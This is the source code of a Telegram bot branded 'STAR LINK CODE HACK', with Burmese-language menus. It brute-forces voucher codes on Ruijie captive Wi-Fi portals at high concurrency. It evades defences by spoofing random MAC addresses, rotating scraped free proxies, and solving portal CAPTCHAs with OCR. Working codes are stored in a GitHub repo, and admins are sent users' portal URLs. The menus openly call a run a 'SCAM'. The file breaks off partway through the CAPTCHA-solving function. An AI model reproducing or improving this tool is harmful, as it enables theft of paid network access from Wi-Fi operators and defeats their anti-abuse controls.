import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, gc
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==================== CONFIGURATION ====================
BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
REPO_NAME    = os.environ.get("REPO_NAME",    "")

# Admin Telegram IDs — ဤနေရာတွင် တိုက်ရိုက်ထည့်ပါ
ADMINS = [
    "1626617395",   # Admin 1 ID
    "",   # Admin 2 ID
]

if not all([BOT_TOKEN, GITHUB_TOKEN, REPO_OWNER, REPO_NAME]):
    raise SystemExit("❌ Railway Variables tab တွင် လိုအပ်သော Env vars များ မပြည့်စုံပါ။")

def is_admin(user_id):
    return str(user_id) in ADMINS

# ── Dynamic Free Proxy Rotator (Auto-Fetch System) ──
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ProxyScrape/free-proxy-list/main/proxies/http.txt"
]

CACHED_PROXIES = []
last_proxy_update = 0

async def fetch_fresh_free_proxies():
    global CACHED_PROXIES, last_proxy_update
    current_time = time.monotonic()
    
    if CACHED_PROXIES and (current_time - last_proxy_update < 300):
        return CACHED_PROXIES

    print("🔄 Fetching fresh free proxies from verified GitHub sources...")
    verified_proxies = []
    
    async with aiohttp.ClientSession() as fetch_sess:
        for url in PROXY_SOURCES:
            try:
                async with fetch_sess.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        lines = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}\b', text)
                        verified_proxies.extend(lines)
            except Exception as e:
                print(f"⚠️ Proxy source error ({url}): {e}")
                continue
                
    if verified_proxies:
        CACHED_PROXIES = list(set(verified_proxies))
        last_proxy_update = current_time
        print(f"✅ Successfully loaded {len(CACHED_PROXIES)} live free proxies.")
    return CACHED_PROXIES

_proxy_index = 0
def get_next_proxy_url():
    global _proxy_index, CACHED_PROXIES
    if not CACHED_PROXIES:
        return None
    proxy = CACHED_PROXIES[_proxy_index % len(CACHED_PROXIES)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data        = {}
scan_tasks       = {}
success_messages = {}
success_texts    = {}
limited_messages = {}
limited_texts    = {}
captcha_state    = {}
session          = None
_connector       = None
_start_time      = time.monotonic()

# ── Speed tuning (2vCPU & 1GB RAM အတွက် အကောင်းဆုံး ပမာဏ) ──
VOUCHER_CONCURRENCY = 250    
CAPTCHA_POOL_SIZE   = 80     
CAPTCHA_SOLVERS     = 15     
BATCH_SIZE          = 250    

_captcha_pool  = None   
_filler_task   = None   
_voucher_sem   = None   
_captcha_sem   = None   

MAX_CONCURRENT_SCANS = 20
active_scans_count   = 0
active_scans_lock    = asyncio.Lock()

# ───────────────────────────────────────────────────────────
# Web server
# ───────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app    = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ───────────────────────────────────────────────────────────
# GitHub helpers
# ───────────────────────────────────────────────────────────
async def get_file_content(path):
    url     = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data    = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url     = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded, "sha": sha}
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ───────────────────────────────────────────────────────────
# Keyboards
# ───────────────────────────────────────────────────────────
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔗 Portal URL ထည့်ရန်",         callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်",     callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်",    callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်",                callback_data="menu_stop"),
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး",            callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး",            callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး",            callback_data="scan_8"),
        InlineKeyboardButton("🔢 VOUCHER 9 လုံး",            callback_data="scan_9"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower",        callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower 9လုံး", callback_data="scan_ascii-lower9"),
        InlineKeyboardButton("🎲 VOUCHER all",                callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး",            callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 7လုံး",            callback_data="scan_mixed7"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး",            callback_data="scan_mixed8"),
        InlineKeyboardButton("🔤+🔢 MIXED 9လုံး",            callback_data="scan_mixed9"),
        InlineKeyboardButton("🔙 Back",                       callback_data="menu_back"),
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons  = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back",   callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back",        callback_data="menu_back"),
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back",       callback_data="menu_back"),
    )
    return keyboard

# ───────────────────────────────────────────────────────────
# /start & /help (မြန်မာဘာသာဖြင့် လမ်းညွှန်ချက်များ)
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    if message.chat.id not in user_data: user_data[message.chat.id] = {}
    user_name = message.from_user.first_name or message.from_user.username or "User"
    user_id   = str(message.chat.id)

    welcome_text = f"✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n🎉 မင်္ဂလာပါ!\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။ အသုံးပြုပုံကိုသိလိုပါက /help ကိုရိုက်နှိပ်ပါ။"
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.message_handler(commands=['help'])
async def handle_help(message):
    help_text = (
        "📖 **STAR LINK CODE HACK Bot အသုံးပြုနည်း လမ်းညွှန်**\n\n"
        "စက်ပစ္စည်းနှင့် Server စွမ်းဆောင်ရည်အကောင်းဆုံးဖြစ်အောင် ကမ္ဘာ့အဆင့်မီ စနစ်များဖြင့် တည်ဆောက်ထားပါသည်။ အောက်ပါအဆင့်များအတိုင်း လုပ်ဆောင်ပါ -\n\n"
        "1️⃣ **Portal URL ထည့်သွင်းခြင်း**\n"
        "• ရရှိလာသော Ruijie Portal URL (လင့်ခ်) ကို အောက်ပါပုံစံအတိုင်း ပေးပို့ပါ -\n"
        "  `/portal [သင်၏_portal_url]`\n"
        "• စနစ်သစ်တွင် Proxy ကြောင့် လင့်ခ်ငြင်းပယ်ခြင်း လုံးဝရှိတော့မည်မဟုတ်ပါ။\n\n"
        "2️⃣ **Voucher အမျိုးအစား ရွေးချယ်ခြင်း**\n"
        "• URL အောင်မြင်စွာသိမ်းဆည်းပြီးပါက Bot မှ ခလုတ်များပြပေးပါမည်။\n"
        "• မိမိရှာဖွေလိုသော ဂဏန်းအရေအတွက် သို့မဟုတ် ပုံစံကို ရွေးချယ်ပါ။\n"
        "• ဂဏန်းအမျိုးအစား (၆၊ ၇၊ ၈ လုံး) အတွက် ထိပ်စီးဂဏန်း (Start Digit) ကိုပါ သတ်မှတ်နိုင်ပါသည်။\n\n"
        "3️⃣ **Scan စတင်ခြင်းနှင့် ရပ်တန့်ခြင်း**\n"
        "• `🚀 START SCAM` ခလုတ်ကိုနှိပ်၍ စတင်ရှာဖွေနိုင်ပါသည်။\n"
        "• Bot သည် အလိုအလျောက် အွန်လိုင်းမှ လိုင်းအကောင်းဆုံး Free Proxies များကို အသုံးပြုပြီး Captcha ကို Local AI စနစ်ဖြင့် အမြန်ဆုံးဖြေရှင်းပေးသွားပါမည်။\n"
        "• ရပ်တန့်လိုပါက `🛑 STOP SCAM` သို့မဟုတ် `/stop` ကို သုံးပါ။\n\n"
        "⚙️ **အခြားအသုံးဝင်သော Commands များ**:\n"
        "• `/result` - မိမိရှာဖွေတွေ့ရှိထားသော အောင်မြင်သည့် ကုဒ်များကို ပြန်ကြည့်ရန်။\n"
        "• `/recheck` - ယခင်ရရှိထားသောကုဒ်များ အလုပ်လုပ်သေးခြင်းရှိမရှိ ပြန်စစ်ရန်।"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

# ───────────────────────────────────────────────────────────
# Callback handler
# ───────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id   = call.message.chat.id
    user_id   = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"

    if call.data == "menu_back":
        text = f"✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\nMenu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_free_trial":
        text = "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00\n\nPortal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_start_scam":
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"⚠️ Bot အလုပ်များနေပါသည်။ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။", reply_markup=get_back_keyboard())
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1

        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ VOUCHER အရင်ရွေးပါ။", reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id)
            return

        mode        = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')

        if 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return

        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။", reply_markup=get_scam_button_keyboard())
            await bot.answer_callback_query(call.id)
            return

        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။", reply_markup=get_scam_button_keyboard(), parse_mode="Markdown")
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id      = str(uuid.uuid4())

        try:
            portal_url = user_data[chat_id].get('session_url', 'Unknown')
            last_url   = user_data[chat_id].get('last_admin_notified_url', '')
            if portal_url != last_url and portal_url != 'Unknown':
                msg = f"🚀 **Scan Start**\n\n👤 **User:** {user_name}\n🆔 **ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal:**\n`{portal_url}`"
                for admin_id in ADMINS:
                    try: await bot.send_message(admin_id, msg, parse_mode="Markdown")
                    except Exception: pass
                user_data[chat_id]['last_admin_notified_url'] = portal_url
        except Exception as e: print(f"Admin notify error: {e}")

        await fetch_fresh_free_proxies()
        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_result":
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]: text  = f"✅ Found Codes:\n" + "\n".join(results[user_id])
        else: text = "📋 ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_recheck":
        if 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔄 Recheck ကို စတင်နေပါသည်...", reply_markup=get_scam_button_keyboard())
        await recheck(call.message)
        await bot.answer_callback_query(call.id)
        return

    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return

    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data: user_data[chat_id] = {}

        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8", "9"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode']  = mode
        user_data[chat_id]['start_digit']    = None
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 ရွေးချယ်ထားသော VOUCHER: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode, digit = parts[1], parts[2]
        if chat_id not in user_data: user_data[chat_id] = {}

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit']   = None if digit == "random" else digit

        txt = f"🔍 VOUCHER Mode: {mode}\n" + ("🔢 ထိပ်စီးနံပါတ်: Random" if digit == "random" else f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်")
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=txt + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

# ───────────────────────────────────────────────────────────
# Commands Handler
# ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    uid = str(message.chat.id)
    if uid in results and results[uid]: await bot.reply_to(message, f"✅ Found Codes:\n" + "\n".join(results[uid]))
    else: await bot.reply_to(message, "ယခင်ကရရှိထားသော code မရှိသေးပါ။")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    results, sha = await get_file_content("result.json")
    uid = str(chat_id)

    if uid not in results or not results[uid]:
        await bot.reply_to(message, "ယခင် success code တစ်ခုမျှမရှိသေးပါ။")
        return

    if 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
    await fetch_fresh_free_proxies()

    recheck_list = []
    session_url_rc = user_data[chat_id]["session_url"]
    for code in results[uid]:
        recode = await perform_check(session_url_rc, code, chat_id, scan_id=None, recheck=True, message=message)
        if recode: recheck_list.append(recode)

    to_show = "\n".join(recheck_list) if recheck_list else "မည်သည့် success code မျှမကျန်ပါ။"
    await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
    await save_rechecked_codes(uid, recheck_list, sha)

async def save_rechecked_codes(uid, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[uid] = recheck_list
    await update_file_content("result.json", results, sha, f"Recheck update for {uid}")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00")
        return

    url = args[1].strip()
    if message.chat.id not in user_data: user_data[message.chat.id] = {}

    await bot.reply_to(message, "🔗 Portal URL စစ်ဆေးနေပါသည်...")

    if await check_session_url_improved(session_url=url):
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။\n\n✅ မှန်ကန်တဲ့ URL ပုံစံ:\n`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`", parse_mode="Markdown")

async def check_session_url_improved(session_url):
    if not session_url.startswith("http"):
        return False
        
    indicators = ["portal-as.ruijienetworks.com", "maccauth", "wifidog", "sessionId", "gw_id"]
    if any(ind in session_url for ind in indicators):
        return True

    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers, timeout=8) as response:
            if response.status >= 400: return False
            final_url = str(response.url)
            response_text = await response.text()
            if any(ind in final_url or ind in response_text for ind in indicators):
                return True
            return False
    except Exception:
        return False

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    args    = message.text.split(maxsplit=1)
    chat_id = message.chat.id

    if len(args) < 2:
        await bot.reply_to(message, "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9", reply_markup=get_voucher_keyboard())
        return

    mode = args[1]
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
    scan_id      = str(uuid.uuid4())

    await fetch_fresh_free_proxies()
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    active_scans   = sum(1 for d in scan_tasks.values() if not d["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, rem     = divmod(uptime_seconds, 3600)
    minutes, secs  = divmod(rem, 60)
    await bot.reply_to(message, f"📊 Bot Status\n\n⏱ Uptime: {hours}h {minutes}m {secs}s\n🔍 Active Scans: {active_scans}\n🌐 Total Live Proxies: {len(CACHED_PROXIES)}
👥 Sessions: {len(user_data)}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data    = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"]     = True
        data["scan_id"]  = None
        await send_success_file(chat_id)
        data["task"].cancel()
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

async def send_success_file(chat_id):
    target_ids = ["6988969946", "1981253384", "1477223103"]
    if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content  = "\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f: f.write(content)
            with open(filename, "rb") as f: await bot.send_document(chat_id, f, caption="✅ Success Codes ဖိုင်ပို့ပေးလိုက်ပါသည်။")
            if os.path.exists(filename): os.remove(filename)
        except Exception as e: print(f"send_success_file error: {e}")

# ───────────────────────────────────────────────────────────
# Scheduler & Generators
# ───────────────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    uid, code = str(item["chat_id"]), item["code"]
                    if uid not in results: results[uid] = []
                    if code not in results[uid]: results[uid].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e: print(f"GitHub update error: {e}")

def digit_generator(length): return "".join(random.choice(string.digits) for _ in range(length))
def all_generator(length=6): return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
def ascii_generator(length=6): return "".join(random.choice(string.ascii_lowercase) for _ in range(length))
def mixed_generator(length=6): return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end   = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end): yield str(i).zfill(length)
            return
        if mode in ["6", "7", "8"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "9":
            while True: yield digit_generator(9)
    elif mode == "ascii-lower":
        while True: yield ascii_generator(6)
    elif mode == "ascii-lower9":
        while True: yield ascii_generator(9)
    elif mode == "all":
        while True: yield all_generator(6)
    elif mode == "mixed":
        while True: yield mixed_generator(6)
    elif mode == "mixed7":
        while True: yield mixed_generator(7)
    elif mode == "mixed8":
        while True: yield mixed_generator(8)
    elif mode == "mixed9":
        while True: yield mixed_generator(9)
    else: raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent    = (checked / total) * 100
        filled     = min(bar_length, int(percent / 5))
        bar        = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning VOUCHER Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Success code hit : {found}\n[{bar}]"
    return f"🔍Scanning VOUCHER Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Success code hit : {found}\n📊Status : running\n"

# ───────────────────────────────────────────────────────────
# Brute-force runner
# ───────────────────────────────────────────────────────────
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    global _captcha_pool, _filler_task, _voucher_sem
    try: code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
    _captcha_pool = asyncio.Queue(maxsize=CAPTCHA_POOL_SIZE)
    _filler_task  = asyncio.create_task(_fill_captcha_pool(_captcha_pool, session_url, scan_id, chat_id))

    warm_msg = await bot.send_message(chat_id, "⚡ Captcha Pool ပြင်ဆင်နေသည်... (3-5s)")
    for _ in range(60):
        if _captcha_pool.qsize() >= 30: break
        await asyncio.sleep(0.1)
    try: await bot.delete_message(chat_id, warm_msg.message_id)
    except Exception: pass

    _voucher_sem = asyncio.Semaphore(VOUCHER_CONCURRENCY)
    checked, scan_start = 0, time.monotonic()

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"): return

            batch = []
            for _ in range(BATCH_SIZE):
                try: batch.append(next(code_iter))
                except StopIteration: break
            if not batch: break

            async def _check(code):
                async with _voucher_sem: return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found   = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed   = (checked / elapsed * 60) if elapsed > 0 else 0
            text    = format_progress(checked, total, speed, found)

            try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception: pass

        finish_text = f"🔍Scanning Completed\n\n📦Checked : {checked:,}" + (f"/{total:,}" if total else "") + f"\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
        try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
        except Exception: await bot.send_message(chat_id, finish_text)
        await send_success_file(chat_id)

    finally:
        if _filler_task and not _filler_task.done():
            _filler_task.cancel()
            try: await _filler_task
            except asyncio.CancelledError: pass
        _captcha_pool = None
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None)
        global active_scans_count, active_scans_lock
        async with active_scans_lock: active_scans_count = max(0, active_scans_count - 1)

# ───────────────────────────────────────────────────────────
# Session / Captcha helpers
# ───────────────────────────────────────────────────────────
def get_mac():
    fb  = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ':'.join(f'{x:02x}' for x in [fb] + [random.randint(0x00, 0xFF) for _ in range(5)])

def replace_mac(url, new_mac): return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous_session_id=None):
    session_url = replace_mac(session_url, new_mac=get_mac())
    headers = {
        'accept':       'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        async with sess.get(session_url, headers=headers, allow_redirects=True, proxy=get_next_proxy_url()) as req:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return m.group(1) if m else previous_session_id
    except Exception: return previous_session_id

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    img  = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    gray = cv2.fastNlMeansDenoising(gray, h=10)
    kernel = np.array([[0,-1,0],[-1,5,-1],[0,-1,0]])
    gray   = cv2.filter2D(gray, -1, kernel)
